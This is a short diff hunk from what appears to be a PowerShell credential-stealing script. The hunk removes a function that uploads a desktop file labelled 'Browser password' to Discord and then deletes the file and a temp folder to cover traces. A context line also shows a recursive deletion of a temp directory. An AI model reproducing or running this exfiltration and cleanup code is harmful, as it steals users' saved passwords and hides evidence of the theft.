@@ -56,10 +56,3 @@ function version-av {
   cd C:\
   rmdir -R \temp
 }
-
-function Test
-{
-  Upload-Discord -file "$desktop\export.txt" -text "Browser password :"
-  Set-Location -Path "$env:temp"
-  Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\export.txt
-}
